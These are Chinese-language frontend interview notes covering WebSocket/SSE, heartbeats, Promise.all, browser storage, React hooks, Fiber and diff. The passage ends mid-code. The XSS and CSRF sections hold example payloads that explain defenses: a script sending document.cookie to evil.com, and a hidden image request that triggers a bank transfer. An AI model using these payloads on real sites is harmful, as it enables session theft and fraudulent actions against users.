## 字节一面

### Web Socket 和sse 区别

- WebSocket 是一种在浏览器和服务器之间建立“长连接”的协议，可以实现双向实时通信。
- 项目需求分析
    chat-app 是聊天应用， 需求
    - 实时收消息
    - 实时发消息
    - 多人同步
    如果用http:
    - 客户端只能“请求 → 响应”
    - 想实时?
        只能轮询（性能差）
        定时setInterval 
    - 而 WebSocket：
    - 一次连接，持续通信(双工)
    - 服务端可以“主动推送”

    ![](https://img2.baidu.com/it/u=549937028,3721254999&fm=253&fmt=auto&app=138&f=JPEG?w=845&h=500)
    WebScoket socket 协议在web端的实现

    ![](https://img2.baidu.com/it/u=3823662998,3984986978&fm=253&fmt=auto&app=138&f=JPEG?w=1024&h=440)
    HTTP和WebSocket都跑在TCP上。HTTP是请求响应，WebSocket是长连接，能双向实时通信，适合聊天、推送这类场景。

    QQ Wechat 用的就是Socket 协议
    WebScoket 是Socket的Web 版本

- 面试官为什么要靠这个问题？
    - 前端比较熟悉的是http 协议， 跨协议，408（数据结构、计算机组成原理、操作系统和计算机网络）考察
    - sse ai 应用开发的核心体验
    SSE 轻量单向，专为服务端推送设计，更简单适配。
    - websocket 适合实时通信
    WebSocket 是全双工协议，需自定义协议、心跳、重连，复杂度高；

- 项目 2025_chun/html5/chat-app
- 跨域的解决方案
    interview/2025_chun/js/cors/postmessage-demo/index.html
    https://github.com/shunwuyu/ai_lesson/tree/e5414505c45bb06a78e76c4521e83d22f7385e24/interview/2025_chun/js/cors

    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/jsonp/1.html#L11  jsonp 
    https://github.com/shunwuyu/ai_lesson/tree/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/demo 
    cors
    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/cors-demo/server.js cors 预检请求

    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/interview/2025_chun/js/cors/readme.md

### 介绍心跳机制

心跳机制就是：客户端和服务端定期互相“报平安”，用来检测连接是否还活着。

用生活类比

就像两个异地恋人打电话📞：

如果很久没声音，你会说一句：“喂？还在吗？”
对方回一句：“在的”
👉 这就是“心跳”

为什么需要心跳
因为 WebSocket / SSE 是长连接

- 网络可能断了
- 用户可能掉线
- 中间设备（Nginx、负载均衡）可能会自动断开空闲连接（省资源， 服务更多人）
所以必须主动检测连接状态

- 心跳机制怎么实现？
    ping / pong 只是约定俗成的名字，不是规定，你想叫什么都行！
    - 客户端发（最常见）
    ```
    setInterval(() => {
        ws.send(JSON.stringify({ type: 'ping' }))
    }, 30000)
    ```
    服务端收到
    ```
    if (msg.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong' }))
    }
    ```
    - 认为连接断了
    - 触发重连

- 方式二：服务端发
    - 服务端定期 ping
    - 客户端回 pong
    多用于：
    - 即时通讯（IM）
    - 游戏服务器

- 心跳机制一般包含 3 步：

    - 定时发送 ping
    - 接收 pong 响应
    - 超时判断 + 重连机制
- SSE 的心跳怎么做（很多人答不上来）
    SSE 没有内置 ping/pong
    一般这样做：
    res.write(': heartbeat\n\n')
    或者定期推一条空数据
    作用：

    防止连接被中间代理断开
    保持活跃

最后总结（收尾）

👉 心跳机制的本质：

检测连接是否存活
防止“假连接”
配合重连机制保证实时通信稳定

- 重连代码
```
let ws
let timer
let retry = 0

function connect() {
  ws = new WebSocket('ws://localhost:8080')

  ws.onopen = () => {
    retry = 0
    heartbeat()
  }

  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data)
    if (msg.type === 'pong') resetHeartbeat()
  }

  ws.onclose = reconnect
  ws.onerror = reconnect
}

function reconnect() {
  clearInterval(timer)
  setTimeout(connect, Math.min(1000 * 2 ** retry++, 10000))
}

function heartbeat() {
  timer = setInterval(() => {
    ws.send(JSON.stringify({ type: 'ping' }))
  }, 3000)
}

function resetHeartbeat() {
  clearInterval(timer)
  heartbeat()
}

connect()
```
### SSE 客户端和服务端应该怎么设置?

- 场景举例

后端（NestJS @Sse 装饰路由）
- 使用 rxjs 将 llm stream 包装成 Observable 流，
- 通过async generator 异步生成器，配合yield逐次返回文本片段，结合循环持续处理 AI 流与工具调用，实现不间断流式输出。

前端通过 EventSource 监听 SSE 流，实时接收后端推送的 chunk 并追加渲染，实现文字逐字显示的流式输出。
    - 接收sse 的url
    - onmessage

- 除了  EventSource（SSE），还可以使用 原生 fetch + ReadableStream
直接读取流式响应，兼容性强

https://github.com/shunwuyu/ai_lesson/blob/35ef50f402c1299a268a19526aa1eadc32961278/html5/sse/sse-demo/react-event-source/src/App.jsx

- Sse 接口和 res.write原生手动写 HTTP 响应流 区别
@Sse 是标准的 SSE 长连接推送协议，自带格式、自动重连、浏览器原生支持。
res.write 只是原生 HTTP 流写入，没有协议、没有重连、完全手动控制。

- SSE http头怎么设置？
    Content-Type: text/event-stream 告诉浏览器这是 SSE 流式数据，不是普通 HTTP 响应 
    Cache-Control: no-cache 
    防止中间代理/浏览器缓存，保证数据是实时的
    Connection: keep-alive
    http 1.1 HTTP 长连接 + 文本流格式
    保持 TCP 长连接不断开
    Transfer-Encoding: chunked
    启用分块传输，让数据可以一段一段实时推送

    NestJS 的 @Sse 已经默认帮我们设置好了这些头，但如果走 Nginx，还需要关闭 proxy_buffering，否则数据会被缓存导致不实时。


- 和大模型对话的 completion 接口介绍一下。你有什么参数传入了 Completion 接口？为什么用 open AI 原生的 sdk 调用接口？

    - 面试官心态
    考察你对大模型接口原理、参数调优理解，以及工程实践能力（SDK使用、稳定性与封装设计）。

    - completion 接口是大模型的核心对话接口，用来接收用户 prompt 并返回生成文本。即AIGC 核心功能， 除了completion 外， 还有chat Completion 接口，需要传递messages 对话数组， Embeddings接口负责 向量生成， 多模态模型还有image\audio\vision 接口， 上传相应的多媒体文件就好


    - 基础参数
    ```
    {
    model: "gpt-4o-mini",
    messages: [
        { role: "system", content: "你是一个前端专家" },
        { role: "user", content: "解释闭包" }
    ]
    }
    ```
    生成控制（体现理解深度🔥）
    temperature  取值范围是 0 ~ 2，常用 0 ~ 1。
    值越低（0~0.3）：越严谨、固定、确定性高
    值越高（0.7~2）：越随机、创意强、发散性高

    max_tokens 👉 限制输出长度 控制响应长度、避免冗余并节省 token 成本
    stream: true 流式输出
    tools / function calling 让模型调用函数
    返回多少条结果 用参数n

    - 为什么用 OpenAI 原生 SDK

    OpenAI 官方 SDK 是业内通用标准方案，封装完善、兼容性强、迭代及时，使用它能降低接入成本、提升稳定性，也更符合行业最佳实践。

    - 我在拍照记单词项目中 使用了KIMI 图片解析 + 火山引擎tts 
    - 我在nestjs 全栈项目中使用了@langchain/openai 来快速开发llm 应用

### 手撕Promise.all

先说思路

Promise.all 的核心是：并发执行多个 Promise，全部成功才返回结果，只要有一个失败就立即 reject。

实现上我会做三件事：

用数组按顺序收集每个 Promise 的结果
用计数器记录完成数量
任意一个失败就直接 reject，全部成功才 resolve”

同时需要处理非 Promise 值，用 Promise.resolve 包一层

```
Promise.myAll = function (promises) {
  return new Promise((resolve, reject) => {
    const result = []
    let count = 0

    if (promises.length === 0) {
      return resolve([])
    }

    promises.forEach((p, index) => {
      Promise.resolve(p).then(res => {
        result[index] = res
        count++

        if (count === promises.length) {
          resolve(result)
        }
      }).catch(reject)
    })
  })
}
Promise.resolve(p) 
把数组里的每一项 包装成一个标准 Promise 对象
如果本身就是 Promise， 完全无害，会直接返回这个原 Promise 本身
```

```
Promise.myResolve = function(value) {
  // 如果已经是 Promise 实例，直接返回它自己
  if (value instanceof Promise) {
    return value;
  }

  // 如果是 thenable 对象（有 then 方法），包装成标准 Promise
  if (value && typeof value.then === 'function') {
    return new Promise((resolve, reject) => {
      value.then(resolve, reject);
    });
  }

  // 普通值：直接返回一个 已成功(resolved) 的 Promise
  return new Promise(resolve => resolve(value));
};
```

### cookie, sessionStorage, localStorage

- 共性
“cookie、localStorage、sessionStorage 本质都是浏览器端的存储方案，用于在客户端保存数据，实现状态持久化。”

    - 都是键值对存储
    - 都遵循同源策略
    - 都只能存字符串（需手动 JSON 序列化）
    - 都用于保存用户状态（登录态、配置、缓存等）

- 区别
    - Cookie（偏服务端协作）Cookie = 唯一能“自动带到服务端”的存储
    Cookie 容量受限（通常4KB），过大会增加带宽消耗与解析延迟，降低请求性能。建议仅存会话ID，大数据存服务端。
    ![](https://images.openai.com/static-rsc-4/BQoDS4Gs2Ra6uZpUINOcfNVT3XBUk8Ptaa9Q_HcmrlM0590SVjaOXgkh1VEb7Oure_ojATUkuA_I2a8TgVs6mFzMd3BCmho1DVAFpwPJKoNQr9GjLfMbpP1OzpO22awnREjFvQQR2_ZrB25iq8DdhFpQQuDUXj9LcYgJh_U1KTc?purpose=inline)
    ![](https://images.openai.com/static-rsc-4/IWOs5yoRMKvE7F6Au0ZzyIl9-WxNqIbDozkDX3wcUhdY6MFWHySk1g_6wc4VAxFUh-GkW0pRQp9KgeU1e7yeX5pzhMJK2SvWiNrCPT9cSGd1Teqi2nQsAgKe9b1GkvDlTJ1ycFmeeha11rMWu2kNf7_vG3djXrvrb1Dg2NnajKw?purpose=inline)

    客户端先登录，服务器创建会话、把用户信息存起来并生成 session ID 返回给浏览器；之后每次请求都带上这个 ID，服务器收到后用它去数据库或缓存里“捞出”对应的用户对象，验证身份合法后才返回资源。本质是：ID 是钥匙，换来的是完整的用户数据。

    - cookie-login-demo
    - XSS ? http-only 怎么防？
    Cross-Site Scripting（跨站脚本攻击） CSS 避讳
    “XSS（跨站脚本攻击）的本质是：攻击者把恶意 JavaScript 注入到页面里，在用户浏览器中执行。”

    举个例子
    比如评论区没有做过滤，用户输入
    <script>
    fetch('https://evil.com?cookie=' + document.cookie)
    </script>
    当别人打开页面时，这段脚本就会执行，把用户的 cookie 发送给攻击者。”

    “常见危害就是：

    窃取 cookie（劫持登录态）
    冒充用户发请求
    篡改页面内容”

    二、HttpOnly 怎么防 XSS

    “HttpOnly 是加在 Cookie 上的一个属性，它的作用是：
    👉 禁止 JavaScript 读取 Cookie（document.cookie 拿不到）”

    “即使攻击者注入了脚本：

document.cookie

👉 也拿不到带 HttpOnly 的 cookie

这样就防止了最常见的登录态窃取。”

    不过 HttpOnly 只能防止读取 cookie，并不能阻止 XSS 本身执行。

    完整防御思路（拉开差距🔥）

    👉
    “所以实际项目中我会组合多种手段：

    输入过滤 / 输出转义（最根本）
    const clean = input.replace(/[<>"'&]/g, s => ({
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;'
    }[s]))
    <script></script> 会变成
    &lt;script&gt;&lt;/script&gt;
    HttpOnly Cookie 防止敏感信息被读取
    避免使用 innerHTML，改用安全 API”
    el.textContent = userInput

2. localStorage（长期存储）
永久存储（除非手动删除）
不会自动发送给服务器
容量大（≈5MB）
多 tab 共享

localStorage = 持久化配置/缓存

界面主题/购物车临时存储/表单草稿自动保存/JWT/用户行为埋点缓冲：将用户的点击、浏览等行为数据先暂存本地，积攒一定数量后批量上报，降低网络请求频率。/离线数据缓存 商品分类列表 汽车之家名牌

3. sessionStorage（会话级存储）

- 关闭 tab 就清除
- 不同 tab 不共享（重点！）
- 不自动发送给服务器

sessionStorage = 会话级临时状态

页面滚动位置恢复   丛首页到详情页， 再返回， 回到首页的位置
多步骤流程（如支付/注册） 分步骤表单（step1 → step2 → step3） 避免中途刷新丢流程

三、核心区别（面试一定要总结）
特性	Cookie	localStorage	sessionStorage
生命周期	可设置	永久	关闭 tab 清除
是否发给服务器	✅ 自动发送	❌	❌
容量	小（4KB）	大（5MB）	大（5MB）
跨 tab	✅	✅	❌
安全性	可 HttpOnly	❌	❌

CSRF（跨站请求伪造）是指攻击者诱导已登录用户在不知情的情况下发起请求，从而以用户身份执行操作的攻击方式。
比如用户已登录银行网站，此时访问了一个恶意页面，页面中隐藏了一段代码：

<img src="https://bank.com/transfer?to=attacker&amount=1000" />

👉 浏览器会自动携带用户的 Cookie 发起请求，服务器误以为是用户本人操作，从而完成转账。

CSRF 防御本质：让“伪造请求”无法通过身份校验

CSRF Token（最核心 ⭐）

👉 服务端生成随机 token，下发给前端页面，因同源策略限制，恶意网站无法读取受害者域名下的响应头或页面内容，故无法获取该令牌。
```
<!-- HTML 部分 -->
<head>
  <meta name="csrf-token" content="a1b2c3d4-e5f6-7890-g1h2-i3j4k5l6m7n8">
</head>

<!-- JavaScript 部分 (以原生 JS 为例) -->
<script>
  // 1. 获取 Token
  const token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  // 2. 在请求中使用 (例如使用 fetch)
  fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': token  // 放入自定义请求头
    },
    body: JSON.stringify({ amount: 100 })
  });
</script>
```

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  }
})

👉 服务端校验 token 是否匹配

SameSite Cookie

👉 限制 Cookie 跨站携带

Set-Cookie: session=abc; SameSite=Strict
Strict 👉 完全禁止跨站发送
Lax 👉 部分允许（默认）

验证 Referer / Origin
👉 判断请求来源是否合法



- 为什么现在登陆不用cookie, 而用localStorage + token？
    传统 Cookie + Session 方案需要在服务端存储会话数据（内存/Redis），在分布式场景下必须做会话共享，增加系统复杂度和运维成本；同时 Cookie 会自动随请求发送，容易遭受 CSRF 攻击且跨域受限。相比之下，localStorage + token（如 JWT）由前端手动放在 Authorization 头中，服务端无需存储状态，天然适合分布式和微服务架构，扩展性更好，也更灵活可控；再结合 HttpOnly Cookie 或刷新 token 机制，可以进一步提升安全性。

- cookie 为什么比localStorage更安全？
    Cookie 可以设置 HttpOnly、Secure、SameSite 等属性，能禁止 JS 读取、防止 XSS 窃取，并限制跨站请求，安全控制更细；而 localStorage 完全暴露在 JS 环境中，一旦发生 XSS 攻击，数据很容易被直接获取，因此整体安全性不如 Cookie。
    所以双token

    JWT 的流行
    因为它更适应现代应用架构。其无状态、跨域和跨平台的特性，完美解决了分布式系统和前后端分离带来的挑战。


### 浏览器解析页面全过程
    浏览器渲染进程在 render 阶段会先把 HTML 解析成 DOM 树，同时解析 CSS 生成 CSSOM，然后合并成渲染树；接着进行布局（计算每个元素位置和大小），最后进行绘制（paint）, GPU 进程负责把这些绘制指令进行栅格化 + 合成（composite），最终显示到屏幕.

    栅格化就是把“绘制指令”变成一块块像素图片（砌墙），方便 GPU 快速贴到屏幕上显示。

    渲染引擎负责算怎么画，GPU 负责真正把它画出来并合成上屏。

    - render 阶段html做了什么？
    HTML 在 render 阶段会被解析成 DOM 树，而且是流式解析（一边读取 HTML 字节流，一边逐步生成 DOM 节点，不是等全部解析完才一次性构建。），过程中遇到 script 可能阻塞并修改 DOM，同时为后续生成渲染树做准备

### react中 hooks 是怎么实现的？


“React Hooks 本质是：用一个数组（或链表）按顺序存状态，通过调用顺序来定位每个 hook。”

案例驱动

1. 核心矛盾：函数组件是“失忆”的

普通的 JavaScript 函数，每次调用执行完后，里面的局部变量就全部销毁了。
React 的函数组件本质上就是一个函数。

第 1 次渲染：function App() { let [count, setCount] = useState(0); ... } -> 执行完，count 消失。

第 2 次渲染：用户点击按钮，React 重新调用 App() 函数。此时内存里没有上一次的 count 了，一切从零开始。

问题：既然每次都重来，React 怎么知道上一次 count 是 1 还是 10？怎么知道第二个 useState 对应的是哪个数据？

2. 解决方案：外挂一个“剧本提示卡”（数组）

React 在函数外部（组件实例层级）维护了一个数组（通常叫 hooksList 或 memoizedState）。这个数组不会随着函数执行结束而销毁。

function App() {
  const [name, setName] = useState('Alice');   // 第 1 个 Hook
  const [age, setAge] = useState(18);          // 第 2 个 Hook
  const [job, setJob] = useState('Dev');       // 第 3 个 Hook
}

第一次渲染（初始化）：
React 创建一个空数组：[]
执行到第 1 行 useState：React 往数组推入一个新对象 { state: 'Alice' }。数组变成：[{ state: 'Alice' }]
执行到第 2 行 useState：React 往数组推入 { state: 18 }。数组变成：[{ state: 'Alice' }, { state: 18 }]
执行到第 3 行 useState：React 往数组推入 { state: 'Dev' }。数组变成：[{...}, {...}, {...}]
关键点：此时，name 的值其实是从数组索引 0 拿到的，age 是从索引 1 拿到的。
第二次渲染（用户修改了 age）：
用户触发更新，React 再次调用 App() 函数。
注意：这次不再创建新数组，而是复用上次那个已经存有数据的数组：[{ state: 'Alice' }, { state: 18 }, { state: 'Dev' }]。
执行到第 1 行 useState：React 不推入新数据，而是直接读取数组索引 0 的数据 -> 拿到 'Alice'。
执行到第 2 行 useState：React 读取数组索引 1 的数据 -> 拿到 18。
执行到第 3 行 useState：React 读取数组索引 2 的数据 -> 拿到 'Dev'。
3. 为什么必须是“数组”且依赖“顺序”？
因为函数组件内部没有名字留给 React 识别（数组性能更优， map慢）！
当你写 const [name, setName] = useState(...) 时，变量名 name 只是你代码里的别名，React 运行时看不到 "name" 这个字符串，它只看到调用了 useState 这个函数。
如果没有顺序限制：
React 不知道当前调用的 useState 对应数组里的哪一张“提示卡”。
有了顺序限制：
React 只需要一个指针 cursor。
遇到第 1 个 useState，指针指向 array[0]。
遇到第 2 个 useState，指针指向 array[1]。
只要代码书写顺序不变，指针就能精准找到对应的数据。

- 如果顺序乱了会发生什么？（
假如你在第二次渲染时，因为在中间加了一个 if 判断，导致少执行了一个 useState：

// 错误示范
function App() {
  const [name, setName] = useState('Alice'); // 读 array[0] -> 'Alice' (正常)
  
  if (someCondition) {
     // 假设这里条件变了，这行没执行！
     // const [age, setAge] = useState(18); 
  }
  
  const [job, setJob] = useState('Dev'); // 原本该读 array[2]，但现在它是第 2 个被调用的，所以读了 array[1]!
}

job 变量竟然拿到了 18（原本属于 age 的数据）！类型错乱，程序崩溃。

为什么要数组？ 因为函数局部变量存不住状态，必须存在函数外部的持久化容器里。
为什么要按顺序？ 因为 React 没法给每个 Hook 起名字（变量名运行时不可见），只能靠“第几次调用”作为身份证（索引）去数组里取对应的数据。
这就是为什么 React 规定：Hook 不能在循环、条件判断或嵌套函数中调用。

就好像吃饭店排队叫位一样

### 对fiber 机制的理解？

- fiber 机制
Fiber 是 React16 引入的一套可中断、可恢复的渲染机制，本质是把原来一次性执行的渲染过程，拆成很多小任务，避免长时间阻塞主线程。

Fiber = 可调度的虚拟 DOM

- 虚拟 DOM vs Fiber

    - 虚拟 DOM（简单结构）
    ```
    const vdom = {
        type: 'div',
        props: { children: [...] }
    }
    ```
    将直接操作慢速真实DOM，转为快速内存计算，批量最小化更新。

    - Fiber 节点（重点⭐）
    const fiber = {
        type: 'div',
        stateNode: dom,      // 真实 DOM
        child: null,         // 第一个子节点
        sibling: null,       // 兄弟节点
        return: null,        // 父节点
        alternate: null      // 双缓存（旧 fiber）
    }

    ![](https://images.openai.com/static-rsc-4/P6bVBOJsWCqiX09IVzX0afIFA1x8pjd3YZ926JztLbewkyS3xPzkcYqb9vl487u6IYy8Ar7ClnvZJwrhUvbxvDaQo-vcaJdPUhP_V_fC_-Y3Fd-dugWBCYiScFR9MDJzRSn5PRYBGTmICh-RM2gAvw7FsUH81qmq1A-xj-89em4?purpose=inline)

    你住的老房子（真实 DOM）太慢，每次改个墙色都得拆墙重刷 —— React 说：“别急，我先在纸上画个新布局（虚拟 DOM），算清楚哪几块要动。”
然后它派了个聪明工头叫 Fiber（橙色那串），边画图边能中途停下接电话（可中断渲染），不打扰你睡觉。
等图纸定稿（Render Phase），工头带人冲进去只改需要动的地方（Commit + DOM Update），省时省力。
生命周期就是房子从盖好（Mounting）、翻新（Updating）到拆掉（Unmounting）的全过程；Hooks 是你随时喊“我要加个插座！”的工具包。
整张图就一句话：React 靠“纸面预演 + 智能施工”，让你网页丝滑如德芙。

    ![](https://images.openai.com/static-rsc-4/7X2QaLD3fyO9k4LkHajvqIyiPYb5BQNeQS8mDMFljdkUC0YyYTBgQQbsYDr5-LBP1kl6tVAJTUQaKPmw8XM8z0R64Ln-lrdInyfEgrYHldlrPrDWJXqzhgSdvQVTRYgsfs5aYUN72qtaYaTsEWTB67hxTCR0_Ws5nlE7M0mUCl8?purpose=inline)

    这张图讲的是 React Fiber 怎么“链表化”树结构：div 是爹，h1 是第一个孩子（child），h2、h3 是 h1 的兄弟（sibling），靠指针串起来。这样遍历不用递归，能随时暂停继续——就像打游戏存档读档，渲染不卡壳！

    fiber 本质 = 链表 + 树（方便中断遍历）

四、Fiber 遍历原理

    “Fiber 用的是深度优先遍历（DFS），但和递归不同，它是可中断的循环。”

    function performUnitOfWork(fiber) {
  // 1. 处理当前节点
  console.log('处理:', fiber.type)

  // 2. 先找子节点
  if (fiber.child) {
    return fiber.child
  }

  // 3. 没子节点 → 找兄弟
  let next = fiber
  while (next) {
    if (next.sibling) {
      return next.sibling
    }
    next = next.return
  }
}

遍历顺序

A
├── B
│   └── D
└── C

A → B → D → C

五、为什么 Fiber 可以中断？（重点🔥）

👉
“因为它是一个 while 循环，每处理一个节点就是一个‘任务单元’”

function workLoop(deadline) {
  // 循环执行条件：
  // 1. nextUnitOfWork: 还有未完成的工作单元（Fiber 节点）
  // 2. deadline.timeRemaining() > 0: 浏览器当前帧还有剩余空闲时间（通常约 5-15ms）
  while (nextUnitOfWork && deadline.timeRemaining() > 0) {
    // 处理当前的 Fiber 节点：
    // - 计算该节点的变更（diff）
    // - 创建子节点或兄弟节点的 Fiber 对象
    // - 返回下一个需要处理的任务单元
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork)
  }

  // 如果时间用完了但任务还没做完（nextUnitOfWork 依然存在）
  if (nextUnitOfWork) {
    // 让出主线程控制权，告诉浏览器：“等下一帧有空闲时，再叫我继续干活”
    // 这样就不会阻塞动画和用户交互，实现“时间切片”
    requestIdleCallback(workLoop)
  }
}

浏览器有空才执行
👉 没空就暂停，下次继续

“Fiber 是 React16 引入的可中断渲染机制，本质是对虚拟 DOM 的增强，每个节点不仅表示 UI，还包含调度信息。它通过 child、sibling、return 组成链表结构，用循环实现深度优先遍历，从而可以拆分任务、支持中断和恢复。这样在大规模更新时不会阻塞主线程，提升用户体验。”

### 手写深度优先
深度优先（DFS）就是：先一路往“最深的子节点”走到底，再回头找兄弟节点继续。
广度优先（BFS）就是：一层一层往下遍历，先把同一层的节点都访问完，再进入下一层。

```
// 深度优先遍历（DFS）- 递归实现
function dfs(node) {
  // 1. 终止条件：节点为空直接返回
  if (!node) return

  // 2. 访问当前节点（先序遍历）
  console.log(node.val)

  // 3. 递归遍历所有子节点（一直往“深处”走）
  node.children?.forEach(child => dfs(child))
}

// 示例树结构
const tree = {
  val: 'A',
  children: [
    {
      val: 'B',
      children: [
        { val: 'D' } // B 的子节点
      ]
    },
    { val: 'C' } // A 的另一个子节点
  ]
}


// 调用 DFS
dfs(tree)

// 输出顺序：A → B → D → C
// 过程：
// 先访问 A
// → 进入 B
// → 进入 D（最深）
// → 回到 B（无兄弟）
// → 回到 A，再访问 C
```

广度优先遍历（BFS）本质就是层序遍历 👍

// 广度优先遍历（BFS）- 使用队列
function bfs(root) {
  // 1. 边界判断
  if (!root) return

  const queue = [root] // 初始化队列（先进先出）

  // 2. 队列不为空就一直遍历
  while (queue.length) {
    const node = queue.shift() // 取出当前层第一个节点

    console.log(node.val) // 访问节点

    // 3. 把子节点依次加入队列（保证按层顺序）
    node.children?.forEach(child => {
      queue.push(child)
    })
  }
}

// 示例树
const tree = {
  val: 'A',
  children: [
    {
      val: 'B',
      children: [{ val: 'D' }]
    },
    { val: 'C' }
  ]
}

// 调用
bfs(tree)

// 输出：A → B → C → D
// 过程：
// 第1层：A
// 第2层：B, C
// 第3层：D

###

### React 的 diff 算法

React 的 diff 算法本质是：在同层节点中，通过 key 做对比，尽量复用 DOM，减少真实 DOM 操作。

![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9f0312e46cfa4d978397c429ab4c191b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

两棵树做 diff，复杂度是 O(n^3) 的，因为每个节点都要去和另一棵树的全部节点对比一次，这就是 n 了，如果找到有变化的节点，执行插入、删除、修改也是 n 的复杂度。所有的节点都是这样，再乘以 n，所以是 O(n * n * n) 的复杂度。

这样的复杂度对于前端框架来说是不可接受的，这意味着 1000 个节点，渲染一次就要处理 1000 * 1000 * 1000，一共 10 亿次。

所以前端框架的 diff 约定了两种处理原则：只做同层的对比，type 变了就不再对比子节点。

因为 dom 节点做跨层级移动的情况还是比较少的，一般情况下都是同一层级的 dom 的增删改。

这样只要遍历一遍，对比一下 type 就行了，是 O(n) 的复杂度，而且 type 变了就不再对比子节点，能省下一大片节点的遍历。另外，因为 vdom 中记录了关联的 dom 节点，执行 dom 的增删改也不需要遍历，是 O(1)的，整体的 diff 算法复杂度就是 O(n) 的复杂度。

![](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5dbd325446ee4d219d6e8876219718c1~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

原来的 <p> 和它的子节点 <span>'guang'</span> 会被整个删除（卸载），因为它们在右边新树中“对应位置”被替换成了一个全新的 <div> 结构 —— React 认为这是类型变更，直接销毁旧子树、创建新子树，不会尝试复用或移动。

- 这样的算法虽然复杂度低了，却还是存在问题的。

type 变了就不再对比子节点的缺点

比如一组节点，假设有 5 个，类型是 ABCDE，下次渲染出来的是 EABCD，这时候逐一对比，发现 type 不一样，就会重新渲染这 5 个节点。

而且根据 type 不同就不再对比子节点的原则，如果这些节点有子节点，也会重新渲染。

dom 操作是比较慢的，这样虽然 diff 的算法复杂度是低了，重新渲染的性能也不高。

所以，diff 算法除了考虑本身的时间复杂度之外，还要考虑一个因素：dom 操作的次数。

上面那个例子的 ABCDE 变为 EABCD，很明显只需要移动一下 E 就行了，根本不用创建新元素。

但是怎么对比出是同个节点发生了移动呢？

判断 type 么？ 那不行，同 type 的节点可能很多，区分不出来的。

最好每个节点都是有唯一的标识。

所以当渲染一组节点的时候，前端框架会让开发者指定 key，通过 key 来判断是不是有点节点只是发生了移动，从而直接复用。

diff 算法处理一组节点的对比的时候，就要根据 key 来再做一次算法的优化。

我们会把基于 key 的两组节点的 diff 算法叫做多节点 diff 算法，它是整个 vdom 的 diff 算法的一部分。

```
// 旧节点列表 (Old Children)
[
  <li key="A">A</li>,
  <li key="B">B</li>,
  <li key="C">C</li>,
  <li key="D">D</li>
]

// 新节点列表 (New Children) - 场景：删除了 B，插入了 E，顺序打乱
[
  <li key="A">A</li>,
  <li key="C">C</li>,
  <li key="E">E</li>, // 新增
  <li key="D">D</li>
]

// React 的处理结果 (逻辑示意)：
// 1. A: 复用 (位置不变)
// 2. B: 删除 (新列表中没有 key="B")
// 3. C: 复用 (向前移动)
// 4. E: 创建并插入
// 5. D: 复用 (位置不变)
```

#### 多节点 diff 算法

### 简单 diff

渲染 ABCD 一组节点，再次渲染是 DCAB
多节点 diff 算法的目的是为了尽量复用节点，通过移动节点代替创建。
所以新 vnode 数组的每个节点我们都要找下在旧 vnode 数组中有没有对应 key 的，有的话就移动到新的位置，没有的话再创建新的。

![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d5389c6be37443318d71a9c09aefde7e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

```
// 获取旧虚拟 DOM 节点和新虚拟 DOM 节点的子节点列表
const oldChildren = n1.children;
const newChildren = n2.children;

// lastIndex 用于记录当前已匹配到的旧节点中最大的索引位置
// 目的是判断是否需要移动节点（如果新节点对应的旧节点索引小于 lastIndex，说明它被“提前”了，需要移动）
let lastIndex = 0;

// ==================== 第一阶段：遍历新子节点列表 ====================
for (let i = 0; i < newChildren.length; i++) {
  const newNode = newChildren[i]; // 当前要处理的新节点
  let j = 0;                      // 用于遍历旧子节点的指针
  let find = false;               // 标记是否在新旧节点中找到 key 相同的节点

  // ==================== 在旧子节点中查找是否有相同 key 的节点 ====================
  for (j; j < oldChildren.length; j++) {
    const oldNode = oldChildren[j]; // 当前正在比较的旧节点

    // 如果找到 key 相同的节点 → 表示可以复用该节点
    if (newNode.key === oldNode.key) {
      find = true; // 标记找到了可复用的节点

      // 调用 patch 函数更新这个节点的内容（属性、事件、子节点等）
      patch(oldNode, newNode, container);

      // 判断是否需要移动 DOM 元素：
      // 如果旧节点在原列表中的位置 j 小于 lastIndex，
      // 说明这个节点在新列表中“提前出现”，需要向后移动以保持顺序
      if (j < lastIndex) {
        // 获取前一个新节点（即上一个已经处理过的新节点）
        const prevVNode = newChildren[i - 1];

        // 如果存在前一个节点，则把当前节点插入到它的下一个兄弟节点之前
        if (prevVNode) {
          const anchor = prevVNode.el.nextSibling; // 锚点：前一个节点的下一个兄弟
          insert(newNode.el, container, anchor);   // 插入操作
        }
      } else {
        // 否则，更新 lastIndex 为当前匹配的旧节点索引 j
        // 表示到目前为止，我们按顺序匹配到了第 j 个旧节点
        lastIndex = j;
      }

      break; // 找到后跳出内层循环，继续处理下一个新节点
    }
  }

  // ==================== 如果没有找到可复用的旧节点 → 创建新节点 ====================
  if (!find) {
    const prevVNode = newChildren[i - 1]; // 获取前一个新节点
    let anchor = null;

    // 确定插入位置：
    // 如果有前一个节点，则插入到它的下一个兄弟之前
    if (prevVNode) {
      anchor = prevVNode.el.nextSibling;
    } else {
      // 如果是第一个节点，则插入到容器的第一个子节点之前（即开头）
      anchor = container.firstChild;
    }

    // 调用 patch(null, newNode, ...) 表示这是一个全新的节点，需要创建并挂载
    patch(null, newNode, container, anchor);
  }
}

// ==================== 第二阶段：清理未被使用的旧节点 ====================
// 遍历所有旧子节点，检查它们是否在新子节点中存在（通过 key 匹配）
for (let i = 0; i < oldChildren.length; i++) {
  const oldVNode = oldChildren[i];

  // 在新子节点列表中查找是否存在与当前旧节点 key 相同的节点
